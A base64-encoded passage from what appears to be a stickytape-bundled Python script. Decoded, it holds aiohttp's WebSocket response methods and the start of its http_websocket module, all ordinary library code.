CAgICBzZWxmLl9jb21wcmVzcyA9IGNvbXByZXNzXHJcbiAgICAgICAgdHJhbnNwb3J0ID0gcmVxdWVzdC5fcHJvdG9jb2wudHJhbnNwb3J0XHJcbiAgICAgICAgYXNzZXJ0IHRyYW5zcG9ydCBpcyBub3QgTm9uZVxyXG4gICAgICAgIHdyaXRlciA9IFdlYlNvY2tldFdyaXRlcihcclxuICAgICAgICAgICAgcmVxdWVzdC5fcHJvdG9jb2wsIHRyYW5zcG9ydCwgY29tcHJlc3M9Y29tcHJlc3MsIG5vdGFrZW92ZXI9bm90YWtlb3ZlclxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgcmV0dXJuIHByb3RvY29sLCB3cml0ZXJcclxuXHJcbiAgICBkZWYgX3Bvc3Rfc3RhcnQoXHJcbiAgICAgICAgc2VsZiwgcmVxdWVzdDogQmFzZVJlcXVlc3QsIHByb3RvY29sOiBzdHIsIHdyaXRlcjogV2ViU29ja2V0V3JpdGVyXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fd3NfcHJvdG9jb2wgPSBwcm90b2NvbFxyXG4gICAgICAgIHNlbGYuX3dyaXRlciA9IHdyaXRlclxyXG5cclxuICAgICAgICBzZWxmLl9yZXNldF9oZWFydGJlYXQoKVxyXG5cclxuICAgICAgICBsb29wID0gc2VsZi5fbG9vcFxyXG4gICAgICAgIGFzc2VydCBsb29wIGlzIG5vdCBOb25lXHJcbiAgICAgICAgc2VsZi5fcmVhZGVyID0gRmxvd0NvbnRyb2xEYXRhUXVldWUocmVxdWVzdC5fcHJvdG9jb2wsIDIgKiogMTYsIGxvb3A9bG9vcClcclxuICAgICAgICByZXF1ZXN0LnByb3RvY29sLnNldF9wYXJzZXIoXHJcbiAgICAgICAgICAgIFdlYlNvY2tldFJlYWRlcihzZWxmLl9yZWFkZXIsIHNlbGYuX21heF9tc2dfc2l6ZSwgY29tcHJlc3M9c2VsZi5fY29tcHJlc3MpXHJcbiAgICAgICAgKVxyXG4gICAgICAgICMgZGlzYWJsZSBIVFRQIGtlZXBhbGl2ZSBmb3IgV2ViU29ja2V0XHJcbiAgICAgICAgcmVxdWVzdC5wcm90b2NvbC5rZWVwX2FsaXZlKEZhbHNlKVxyXG5cclxuICAgIGRlZiBjYW5fcHJlcGFyZShzZWxmLCByZXF1ZXN0OiBCYXNlUmVxdWVzdCkgLT4gV2ViU29ja2V0UmVhZHk6XHJcbiAgICAgICAgaWYgc2VsZi5fd3JpdGVyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkFscmVhZHkgc3RhcnRlZCIpXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBfLCBwcm90b2NvbCwgXywgXyA9IHNlbGYuX2hhbmRzaGFrZShyZXF1ZXN0KVxyXG4gICAgICAgIGV4Y2VwdCBIVFRQRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICByZXR1cm4gV2ViU29ja2V0UmVhZHkoRmFsc2UsIE5vbmUpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIFdlYlNvY2tldFJlYWR5KFRydWUsIHByb3RvY29sKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNsb3NlZChzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jbG9zZWRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjbG9zZV9jb2RlKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nsb3NlX2NvZGVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB3c19wcm90b2NvbChzZWxmKSAtPiBPcHRpb25hbFtzdHJdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl93c19wcm90b2NvbFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbXByZXNzKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NvbXByZXNzXHJcblxyXG4gICAgZGVmIGV4Y2VwdGlvbihzZWxmKSAtPiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZXhjZXB0aW9uXHJcblxyXG4gICAgYXN5bmMgZGVmIHBpbmcoc2VsZiwgbWVzc2FnZTogYnl0ZXMgPSBiIiIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fd3JpdGVyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ2FsbCAucHJlcGFyZSgpIGZpcnN0IilcclxuICAgICAgICBhd2FpdCBzZWxmLl93cml0ZXIucGluZyhtZXNzYWdlKVxyXG5cclxuICAgIGFzeW5jIGRlZiBwb25nKHNlbGYsIG1lc3NhZ2U6IGJ5dGVzID0gYiIiKSAtPiBOb25lOlxyXG4gICAgICAgICMgdW5zb2xpY2l0ZWQgcG9uZ1xyXG4gICAgICAgIGlmIHNlbGYuX3dyaXRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbGwgLnByZXBhcmUoKSBmaXJzdCIpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyLnBvbmcobWVzc2FnZSlcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9zdHIoc2VsZiwgZGF0YTogc3RyLCBjb21wcmVzczogT3B0aW9uYWxbYm9vbF0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX3dyaXRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbGwgLnByZXBhcmUoKSBmaXJzdCIpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZGF0YSwgc3RyKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJkYXRhIGFyZ3VtZW50IG11c3QgYmUgc3RyICglcikiICUgdHlwZShkYXRhKSlcclxuICAgICAgICBhd2FpdCBzZWxmLl93cml0ZXIuc2VuZChkYXRhLCBiaW5hcnk9RmFsc2UsIGNvbXByZXNzPWNvbXByZXNzKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kX2J5dGVzKHNlbGYsIGRhdGE6IGJ5dGVzLCBjb21wcmVzczogT3B0aW9uYWxbYm9vbF0gPSBOb25lKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX3dyaXRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbGwgLnByZXBhcmUoKSBmaXJzdCIpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZGF0YSwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJkYXRhIGFyZ3VtZW50IG11c3QgYmUgYnl0ZS1pc2ggKCVyKSIgJSB0eXBlKGRhdGEpKVxyXG4gICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlci5zZW5kKGRhdGEsIGJpbmFyeT1UcnVlLCBjb21wcmVzcz1jb21wcmVzcylcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9qc29uKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogQW55LFxyXG4gICAgICAgIGNvbXByZXNzOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICAgICAgKixcclxuICAgICAgICBkdW1wczogSlNPTkVuY29kZXIgPSBqc29uLmR1bXBzLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuc2VuZF9zdHIoZHVtcHMoZGF0YSksIGNvbXByZXNzPWNvbXByZXNzKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZV9lb2Yoc2VsZikgLT4gTm9uZTogICMgdHlwZTogaWdub3JlW292ZXJyaWRlXVxyXG4gICAgICAgIGlmIHNlbGYuX2VvZl9zZW50OlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBpZiBzZWxmLl9wYXlsb2FkX3dyaXRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIlJlc3BvbnNlIGhhcyBub3QgYmVlbiBzdGFydGVkIilcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jbG9zZSgpXHJcbiAgICAgICAgc2VsZi5fZW9mX3NlbnQgPSBUcnVlXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYsICosIGNvZGU6IGludCA9IFdTQ2xvc2VDb2RlLk9LLCBtZXNzYWdlOiBieXRlcyA9IGIiIikgLT4gYm9vbDpcclxuICAgICAgICBpZiBzZWxmLl93cml0ZXIgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYWxsIC5wcmVwYXJlKCkgZmlyc3QiKVxyXG5cclxuICAgICAgICBzZWxmLl9jYW5jZWxfaGVhcnRiZWF0KClcclxuICAgICAgICByZWFkZXIgPSBzZWxmLl9yZWFkZXJcclxuICAgICAgICBhc3NlcnQgcmVhZGVyIGlzIG5vdCBOb25lXHJcblxyXG4gICAgICAgICMgd2UgbmVlZCB0byBicmVhayBgcmVjZWl2ZSgpYCBjeWNsZSBmaXJzdCxcclxuICAgICAgICAjIGBjbG9zZSgpYCBtYXkgYmUgY2FsbGVkIGZyb20gZGlmZmVyZW50IHRhc2tcclxuICAgICAgICBpZiBzZWxmLl93YWl0aW5nIGlzIG5vdCBOb25lIGFuZCBub3Qgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICByZWFkZXIuZmVlZF9kYXRhKFdTX0NMT1NJTkdfTUVTU0FHRSwgMClcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fd2FpdGluZ1xyXG5cclxuICAgICAgICBpZiBub3Qgc2VsZi5fY2xvc2VkOlxyXG4gICAgICAgICAgICBzZWxmLl9jbG9zZWQgPSBUcnVlXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlci5jbG9zZShjb2RlLCBtZXNzYWdlKVxyXG4gICAgICAgICAgICAgICAgd3JpdGVyID0gc2VsZi5fcGF5bG9hZF93cml0ZXJcclxuICAgICAgICAgICAgICAgIGFzc2VydCB3cml0ZXIgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgICAgIGF3YWl0IHdyaXRlci5kcmFpbigpXHJcbiAgICAgICAgICAgIGV4Y2VwdCAoYXN5bmNpby5DYW5jZWxsZWRFcnJvciwgYXN5bmNpby5UaW1lb3V0RXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIHNlbGYuX2V4Y2VwdGlvbiA9IGV4Y1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2Nsb3Npbmc6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuICAgICAgICAgICAgcmVhZGVyID0gc2VsZi5fcmVhZGVyXHJcbiAgICAgICAgICAgIGFzc2VydCByZWFkZXIgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhc3luY190aW1lb3V0LnRpbWVvdXQoc2VsZi5fdGltZW91dCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbXNnID0gYXdhaXQgcmVhZGVyLnJlYWQoKVxyXG4gICAgICAgICAgICBleGNlcHQgYXN5bmNpby5DYW5jZWxsZWRFcnJvcjpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBXU0Nsb3NlQ29kZS5BQk5PUk1BTF9DTE9TVVJFXHJcbiAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBXU0Nsb3NlQ29kZS5BQk5PUk1BTF9DTE9TVVJFXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9leGNlcHRpb24gPSBleGNcclxuICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgICAgICAgICBpZiBtc2cudHlwZSA9PSBXU01zZ1R5cGUuQ0xPU0U6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gbXNnLmRhdGFcclxuICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gV1NDbG9zZUNvZGUuQUJOT1JNQUxfQ0xPU1VSRVxyXG4gICAgICAgICAgICBzZWxmLl9leGNlcHRpb24gPSBhc3luY2lvLlRpbWVvdXRFcnJvcigpXHJcbiAgICAgICAgICAgIHJldHVybiBUcnVlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlY2VpdmUoc2VsZiwgdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSkgLT4gV1NNZXNzYWdlOlxyXG4gICAgICAgIGlmIHNlbGYuX3JlYWRlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbGwgLnByZXBhcmUoKSBmaXJzdCIpXHJcblxyXG4gICAgICAgIGxvb3AgPSBzZWxmLl9sb29wXHJcbiAgICAgICAgYXNzZXJ0IGxvb3AgaXMgbm90IE5vbmVcclxuICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICBpZiBzZWxmLl93YWl0aW5nIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDb25jdXJyZW50IGNhbGwgdG8gcmVjZWl2ZSgpIGlzIG5vdCBhbGxvd2VkIilcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nvbm5fbG9zdCArPSAxXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9jb25uX2xvc3QgPj0gVEhSRVNIT0xEX0NPTk5MT1NUX0FDQ0VTUzpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIldlYlNvY2tldCBjb25uZWN0aW9uIGlzIGNsb3NlZC4iKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFdTX0NMT1NFRF9NRVNTQUdFXHJcbiAgICAgICAgICAgIGVsaWYgc2VsZi5fY2xvc2luZzpcclxuICAgICAgICAgICAgICAgIHJldHVybiBXU19DTE9TSU5HX01FU1NBR0VcclxuXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3dhaXRpbmcgPSBsb29wLmNyZWF0ZV9mdXR1cmUoKVxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggYXN5bmNfdGltZW91dC50aW1lb3V0KHRpbWVvdXQgb3Igc2VsZi5fcmVjZWl2ZV90aW1lb3V0KTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbXNnID0gYXdhaXQgc2VsZi5fcmVhZGVyLnJlYWQoKVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3Jlc2V0X2hlYXJ0YmVhdCgpXHJcbiAgICAgICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRpbmdcclxuICAgICAgICAgICAgICAgICAgICBzZXRfcmVzdWx0KHdhaXRlciwgVHJ1ZSlcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl93YWl0aW5nID0gTm9uZVxyXG4gICAgICAgICAgICBleGNlcHQgKGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3IsIGFzeW5jaW8uVGltZW91dEVycm9yKTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBXU0Nsb3NlQ29kZS5BQk5PUk1BTF9DTE9TVVJFXHJcbiAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgICAgICBleGNlcHQgRW9mU3RyZWFtOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLk9LXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNsb3NlKClcclxuICAgICAgICAgICAgICAgIHJldHVybiBXU01lc3NhZ2UoV1NNc2dUeXBlLkNMT1NFRCwgTm9uZSwgTm9uZSlcclxuICAgICAgICAgICAgZXhjZXB0IFdlYlNvY2tldEVycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBleGMuY29kZVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jbG9zZShjb2RlPWV4Yy5jb2RlKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFdTTWVzc2FnZShXU01zZ1R5cGUuRVJST1IsIGV4YywgTm9uZSlcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9leGNlcHRpb24gPSBleGNcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NpbmcgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gV1NDbG9zZUNvZGUuQUJOT1JNQUxfQ0xPU1VSRVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gV1NNZXNzYWdlKFdTTXNnVHlwZS5FUlJPUiwgZXhjLCBOb25lKVxyXG5cclxuICAgICAgICAgICAgaWYgbXNnLnR5cGUgPT0gV1NNc2dUeXBlLkNMT1NFOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2luZyA9IFRydWVcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBtc2cuZGF0YVxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuX2Nsb3NlZCBhbmQgc2VsZi5fYXV0b2Nsb3NlOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY2xvc2UoKVxyXG4gICAgICAgICAgICBlbGlmIG1zZy50eXBlID09IFdTTXNnVHlwZS5DTE9TSU5HOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2luZyA9IFRydWVcclxuICAgICAgICAgICAgZWxpZiBtc2cudHlwZSA9PSBXU01zZ1R5cGUuUElORyBhbmQgc2VsZi5fYXV0b3Bpbmc6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnBvbmcobXNnLmRhdGEpXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBlbGlmIG1zZy50eXBlID09IFdTTXNnVHlwZS5QT05HIGFuZCBzZWxmLl9hdXRvcGluZzpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICByZXR1cm4gbXNnXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlY2VpdmVfc3RyKHNlbGYsICosIHRpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUpIC0+IHN0cjpcclxuICAgICAgICBtc2cgPSBhd2FpdCBzZWxmLnJlY2VpdmUodGltZW91dClcclxuICAgICAgICBpZiBtc2cudHlwZSAhPSBXU01zZ1R5cGUuVEVYVDpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlJlY2VpdmVkIG1lc3NhZ2Uge306eyFyfSBpcyBub3QgV1NNc2dUeXBlLlRFWFQiLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICBtc2cudHlwZSwgbXNnLmRhdGFcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBjYXN0KHN0ciwgbXNnLmRhdGEpXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlY2VpdmVfYnl0ZXMoc2VsZiwgKiwgdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSkgLT4gYnl0ZXM6XHJcbiAgICAgICAgbXNnID0gYXdhaXQgc2VsZi5yZWNlaXZlKHRpbWVvdXQpXHJcbiAgICAgICAgaWYgbXNnLnR5cGUgIT0gV1NNc2dUeXBlLkJJTkFSWTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKGYiUmVjZWl2ZWQgbWVzc2FnZSB7bXNnLnR5cGV9Onttc2cuZGF0YSFyfSBpcyBub3QgYnl0ZXMiKVxyXG4gICAgICAgIHJldHVybiBjYXN0KGJ5dGVzLCBtc2cuZGF0YSlcclxuXHJcbiAgICBhc3luYyBkZWYgcmVjZWl2ZV9qc29uKFxyXG4gICAgICAgIHNlbGYsICosIGxvYWRzOiBKU09ORGVjb2RlciA9IGpzb24ubG9hZHMsIHRpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmVcclxuICAgICkgLT4gQW55OlxyXG4gICAgICAgIGRhdGEgPSBhd2FpdCBzZWxmLnJlY2VpdmVfc3RyKHRpbWVvdXQ9dGltZW91dClcclxuICAgICAgICByZXR1cm4gbG9hZHMoZGF0YSlcclxuXHJcbiAgICBhc3luYyBkZWYgd3JpdGUoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDYW5ub3QgY2FsbCAud3JpdGUoKSBmb3Igd2Vic29ja2V0IilcclxuXHJcbiAgICBkZWYgX19haXRlcl9fKHNlbGYpIC0+ICJXZWJTb2NrZXRSZXNwb25zZSI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGZcclxuXHJcbiAgICBhc3luYyBkZWYgX19hbmV4dF9fKHNlbGYpIC0+IFdTTWVzc2FnZTpcclxuICAgICAgICBtc2cgPSBhd2FpdCBzZWxmLnJlY2VpdmUoKVxyXG4gICAgICAgIGlmIG1zZy50eXBlIGluIChXU01zZ1R5cGUuQ0xPU0UsIFdTTXNnVHlwZS5DTE9TSU5HLCBXU01zZ1R5cGUuQ0xPU0VEKTpcclxuICAgICAgICAgICAgcmFpc2UgU3RvcEFzeW5jSXRlcmF0aW9uXHJcbiAgICAgICAgcmV0dXJuIG1zZ1xyXG5cclxuICAgIGRlZiBfY2FuY2VsKHNlbGYsIGV4YzogQmFzZUV4Y2VwdGlvbikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9yZWFkZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3JlYWRlci5zZXRfZXhjZXB0aW9uKGV4YylcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvaHR0cF93ZWJzb2NrZXQucHknLCBiJyIiIldlYlNvY2tldCBwcm90b2NvbCB2ZXJzaW9ucyAxMyBhbmQgOC4iIiJcclxuXHJcbmltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBjb2xsZWN0aW9uc1xyXG5pbXBvcnQganNvblxyXG5pbXBvcnQgcmFuZG9tXHJcbmltcG9ydCByZVxyXG5pbXBvcnQgc3lzXHJcbmltcG9ydCB6bGliXHJcbmZyb20gZW51bSBpbXBvcnQgSW50RW51bVxyXG5mcm9tIHN0cnVjdCBpbXBvcnQgU3RydWN0XHJcbmZyb20gdHlwaW5nIGltcG9ydCBBbnksIENhbGxhYmxlLCBMaXN0LCBPcHRpb25hbCwgUGF0dGVybiwgU2V0LCBUdXBsZSwgVW5pb24sIGNhc3RcclxuXHJcbmZyb20gLmJhc2VfcHJvdG9jb2wgaW1wb3J0IEJhc2VQcm90b2NvbFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBOT19FWFRFTlNJT05TXHJcbmZyb20gLnN0cmVhbXMgaW1wb3J0IERhdGFRdWV1ZVxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgRmluYWxcclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiV1NfQ0xPU0VEX01FU1NBR0UiLFxyXG4gICAgIldTX0NMT1NJTkdfTUVTU0FHRSIsXHJcbiAgICAiV1NfS0VZIixcclxuICAgICJXZWJTb2NrZXRSZWFkZXIiLFxyXG4gICAgIldlYlNvY2tldFdyaXRlciIsXHJcbiAgICAiV1NNZXNzYWdlIixcclxuICAgICJXZWJTb2NrZXRFcnJvciIsXHJcbiAgICAiV1NNc2dUeXBlIixcclxuICAgICJXU0Nsb3NlQ29kZSIsXHJcbilcclxuXHJcblxyXG5jbGFzcyBXU0Nsb3NlQ29kZShJbnRFbnVtKTpcclxuICAgIE9LID0gMTAwMFxyXG4gICAgR09JTkdfQVdBWSA9IDEwMDFcclxuICAgIFBST1RPQ09MX0VSUk9SID0gMTAwMlxyXG4gICAgVU5TVVBQT1JURURfREFUQSA9IDEwMDNcclxuICAgIEFCTk9STUFMX0NMT1NVUkUgPSAxMDA2XHJcbiAgICBJTlZBTElEX1RFWFQgPSAxMDA3XHJcbiAgICBQT0xJQ1lfVklPTEFUSU9OID0gMTAwOFxyXG4gICAgTUVTU0FHRV9UT09fQklHID0gMTAwOVxyXG4gICAgTUFOREFUT1JZX0VYVEVOU0lPTiA9IDEwMTBcclxuICAgIElOVEVSTkFMX0VSUk9SID0gMTAxMVxyXG4gICAgU0VSVklDRV9SRVNUQVJUID0gMTAxMlxyXG4gICAgVFJZX0FHQUlOX0xBVEVSID0gMTAxM1xyXG4gICAgQkFEX0dBVEVXQVkgPSAxMDE0XHJcblxyXG5cclxuQUxMT1dFRF9DTE9TRV9DT0RFUzogRmluYWxbU2V0W2ludF1dID0ge2ludChpKSBmb3IgaSBpbiBXU0Nsb3NlQ29kZX1cclxuXHJcblxyXG5jbGFzcyBXU01zZ1R5cGUoSW50RW51bSk6XHJcbiAgICAjIHdlYnNvY2tldCBzcGVjIHR5cGVzXHJcbiAgICBDT05USU5VQVRJT04gPSAweDBcclxuICAgIFRFWFQgPSAweDFcclxuICAgIEJJTkFSWSA9IDB4MlxyXG4gICAgUElORyA9IDB4OVxyXG4gICAgUE9ORyA9IDB4QVxyXG4gICAgQ0xPU0UgPSAweDhcclxuXHJcbiAgICAjIGFpb2h0dHAgc3BlY2lmaWMgdHlwZXNcclxuICAgIENMT1NJTkcgPSAweDEwMFxyXG4gICAgQ0xPU0VEID0gMHgxMDFcclxuICAgIEVSUk9SID0gMHgxMDJcclxuXHJcbiAgICB0ZXh0ID0gVEVYVFxyXG4gICAgYmluYXJ5ID0gQklOQVJZXHJcbiAgICBwaW5nID0gUElOR1xyXG4gICAgcG9uZyA9IFBPTkdcclxuICAgIGNsb3NlID0gQ0xPU0VcclxuICAgIGNsb3NpbmcgPSBDTE9TSU5HXHJcbiAgICBjbG9zZWQgPSBDTE9TRURcclxuICAgIGVycm9yID0gRVJST1JcclxuXHJcblxyXG5XU19LRVk6IEZpbmFsW2J5dGVzXSA9IGIiMjU4RUFGQTUtRTkxNC00N0RBLTk1Q0EtQzVBQjBEQzg1QjExIlxyXG5cclxuXHJcblVOUEFDS19MRU4yID0gU3RydWN0KCIhSCIpLnVucGFja19mcm9tXHJcblVOUEFDS19MRU4zID0gU3RydWN0KCIhUSIpLnVucGFja19mcm9tXHJcblVOUEFDS19DTE9TRV9DT0RFID0gU3RydWN0KCIhSCIpLnVucGFja1xyXG5QQUNLX0xFTjEgPSBTdHJ1Y3QoIiFCQiIpLnBhY2tcclxuUEFDS19MRU4yID0gU3RydWN0KCIhQkJIIikucGFja1xyXG5QQUNLX0xFTjMgPSBTdHJ1Y3QoIiFCQlEiKS5wYWNrXHJcblBBQ0tfQ0xPU0VfQ09ERSA9IFN0cnVjdCgiIUgiKS5wYWNrXHJcbk1TR19TSVpFOiBGaW5hbFtpbnRdID0gMiAqKiAxNFxyXG5ERUZBVUxUX0xJTUlUOiBGaW5hbFtpbnRdID0gMiAqKiAxNlxyXG5cclxuXHJcbl9XU01lc3NhZ2VCYXNlID0gY29sbGVjdGlvbnMubmFtZWR0dXBsZSgiX1dTTWVzc2FnZUJhc2UiLCBbInR5cGUiLCAiZGF0YSIsICJleHRyYSJdKVxyXG5cclxuXHJcbmNsYXNzIFdTTWVzc2FnZShfV1NNZXNzYWdlQmFzZSk6XHJcbiAgICBkZWYganNvbihzZWxmLCAqLCBsb2FkczogQ2FsbGFibGVbW0FueV0sIEFueV0gPSBqc29uLmxvYWRzKSAtPiBBbnk6XHJcbiAgICAgICAgIiIiUmV0dXJuIHBhcnNlZCBK